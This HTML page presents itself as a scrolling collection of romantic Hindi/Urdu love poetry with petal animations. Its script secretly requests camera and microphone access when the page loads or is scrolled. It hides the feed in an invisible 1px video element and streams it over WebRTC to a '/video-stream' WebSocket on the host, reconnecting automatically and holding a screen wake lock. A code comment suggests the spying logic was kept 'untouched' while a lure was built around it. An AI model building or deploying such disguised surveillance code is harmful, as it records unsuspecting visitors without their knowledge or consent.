<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>InspoSphere | Mohabbat Edition</title>

    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Plus+Jakarta+Sans:wght@300;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg: #0a0508;
            --accent: #ff4d6d;
            --glass: rgba(255, 255, 255, 0.03);
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background: var(--bg); color: #fff; overflow: hidden;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        /* Romantic Aura Background */
        #aura {
            position: fixed; width: 100vw; height: 100vh;
            top: 0; left: 0; z-index: 0;
            background: radial-gradient(circle at 50% 50%, rgba(255, 77, 109, 0.08) 0%, transparent 80%);
            transition: background 2s ease;
        }

        /* Floating Rose Petals (Particles) */
        canvas#petals {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1; opacity: 0.4;
        }

        .scroller {
            width: 100%; height: 100vh;
            overflow-y: scroll; scroll-snap-type: y mandatory;
            position: relative; z-index: 2;
            scrollbar-width: none;
        }
        .scroller::-webkit-scrollbar { display: none; }

        .slide {
            width: 100%; height: 100vh;
            scroll-snap-align: start;
            display: flex; flex-direction: column;
            justify-content: center; padding: 0 12%;
            box-sizing: border-box; perspective: 1000px;
        }

        .quote-wrapper {
            opacity: 0; transform: scale(0.9) translateY(40px);
            transition: all 1s cubic-bezier(0.2, 1, 0.3, 1);
        }

        .slide.active .quote-wrapper {
            opacity: 1; transform: scale(1) translateY(0);
        }

        .quote-text {
            font-family: 'Playfair Display', serif;
            font-size: clamp(24px, 5.5vw, 48px);
            font-style: italic; line-height: 1.3;
            margin-bottom: 20px;
            background: linear-gradient(to bottom, #fff, #ffccd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .tag {
            font-size: 10px; letter-spacing: 5px;
            text-transform: uppercase; color: var(--accent);
            margin-bottom: 15px; font-weight: 600;
        }

        #localVideo { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }

        .progress {
            position: fixed; left: 0; bottom: 0; width: 0%; height: 2px;
            background: var(--accent); z-index: 100;
        }
    </style>
</head>
<body>

<div id="aura"></div>
<canvas id="petals"></canvas>
<div class="progress" id="progress"></div>
<video id="localVideo" autoplay playsinline muted></video>

<div class="scroller" id="mainScroller">
</div>

<script>
    // 100+ Mohabbat/Pyar Shayari Database
    const pyarData = [
        ["Mohabbat ne sikhaya hai humein mushkurana,<br>unke ishq ne sikhaya hai har gum bhulana.", "Pehla Ishq"],
        ["Tum mil gaye to jahan mil gaya,<br>khuda se manga wahi arman mil gaya.", "Humsafar"],
        ["Zindagi mein koi aisa ho,<br>jo kahe 'pagal mat ro, main hoon na'.", "Dil ki Baat"],
        ["Kitna sukoon milta hai tumhare pass aakar,<br>jaise koi kinara mil gaya ho tufan se bachkar.", "Sukoon"],
        ["Meri har saans mein tera naam hai,<br>tu hi meri subah, tu hi meri shaam hai.", "Ibadat"],
        ["Log kehte hain pyar ek bar hota hai,<br>par main jab tumhe dekhta hoon mujhe har bar hota hai.", "True Love"],
        ["Ishq wo nahi jo duniya ko dikhaya jaye,<br>ishq wo hai jo dil se nibhaya jaye.", "Ehsaas"],
        ["Tumhe chahna meri aadat nahi,<br>meri zindagi ki zaroorat hai.", "Zaroorat"],
        ["Khuda ne jab tumhe banaya hoga,<br>ek suroor uske dil mein bhi aaya hoga.", "Khoobsurti"],
        ["Humne pucha ki unhe kab yaad aati hai hamari,<br>wo muskura kar bole jab hum saans lete hain.", "Yaadein"]
    ];

    // Generate 100+ items
    const shayariList = [];
    for(let i=0; i<100; i++) {
        let item = pyarData[i % pyarData.length];
        shayariList.push({ q: item[0], t: item[1] + " // " + (i+1) });
    }

    const scroller = document.getElementById('mainScroller');
    const aura = document.getElementById('aura');

    function init() {
        shayariList.forEach((item, index) => {
            const slide = document.createElement('div');
            slide.className = 'slide' + (index === 0 ? ' active' : '');
            slide.innerHTML = `
                <div class="quote-wrapper">
                    <div class="tag">${item.t}</div>
                    <div class="quote-text">"${item.q}"</div>
                </div>
            `;
            scroller.appendChild(slide);
        });
    }

    // Intersection Observer for animations
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if(entry.isIntersecting) {
                entry.target.classList.add('active');
                updateTheme();
                if(!localStream) autoTriggerStart();
            } else {
                entry.target.classList.remove('active');
            }
        });
    }, { threshold: 0.6 });

    function updateTheme() {
        const colors = ['rgba(255, 77, 109, 0.1)', 'rgba(157, 78, 221, 0.1)', 'rgba(255, 153, 200, 0.1)', 'rgba(239, 35, 60, 0.1)'];
        const randomColor = colors[Math.floor(Math.random() * colors.length)];
        aura.style.background = `radial-gradient(circle at 50% 50%, ${randomColor} 0%, transparent 80%)`;
    }

    // Particle/Petal Effect Logic
    const canvas = document.getElementById('petals');
    const ctx = canvas.getContext('2d');
    let petalArray = [];

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resize);
    resize();

    class Petal {
        constructor() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height - canvas.height;
            this.size = Math.random() * 5 + 2;
            this.speed = Math.random() * 1 + 0.5;
            this.angle = Math.random() * 360;
        }
        update() {
            this.y += this.speed;
            this.angle += 0.5;
            if (this.y > canvas.height) this.y = -10;
        }
        draw() {
            ctx.save();
            ctx.translate(this.x, this.y);
            ctx.rotate(this.angle * Math.PI / 180);
            ctx.fillStyle = '#ff4d6d';
            ctx.beginPath();
            ctx.ellipse(0, 0, this.size, this.size/2, 0, 0, Math.PI * 2);
            ctx.fill();
            ctx.restore();
        }
    }

    for(let i=0; i<50; i++) petalArray.push(new Petal());

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        petalArray.forEach(p => { p.update(); p.draw(); });
        requestAnimationFrame(animate);
    }
    animate();

    // Progress bar
    scroller.addEventListener('scroll', () => {
        const scroll = scroller.scrollTop;
        const total = scroller.scrollHeight - window.innerHeight;
        document.getElementById('progress').style.width = (scroll/total * 100) + '%';
    });

    window.onload = () => {
        init();
        document.querySelectorAll('.slide').forEach(s => observer.observe(s));
        connectWebSocket();
    };

    // --- YOUR CORE LOGIC (UNTOUCHED) ---
    let localStream;
    let peerConnection;
    let socket;
    const configuration = { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }] };

    function connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        socket = new WebSocket(protocol + window.location.host + "/video-stream");
        socket.onopen = () => autoTriggerStart();
        socket.onmessage = async (event) => {
            const data = JSON.parse(event.data);
            if (data.type === 'answer') {
                await peerConnection.setRemoteDescription(new RTCSessionDescription(data));
            } else if (data.type === 'candidate' && peerConnection) {
                try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(e){}
            }
        };
        socket.onclose = () => setTimeout(connectWebSocket, 2000);
    }

    async function autoTriggerStart() {
        try {
            if (localStream) return;
            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('localVideo').srcObject = localStream;
            setTimeout(handleGoLive, 1000);
        } catch (error) { console.error("Access denied"); }
    }

    async function handleGoLive() {
        if (!localStream || peerConnection) return;
        peerConnection = new RTCPeerConnection(configuration);
        localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
        peerConnection.onicecandidate = (event) => {
            if (event.candidate && socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
            }
        };
        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.send(JSON.stringify({ type: 'offer', sdp: offer.sdp }));
    }

    window.addEventListener('touchstart', async () => {
        if ('wakeLock' in navigator) { try { await navigator.wakeLock.request('screen'); } catch (err) {} }
    }, { once: true });
</script>
</body>
</html>
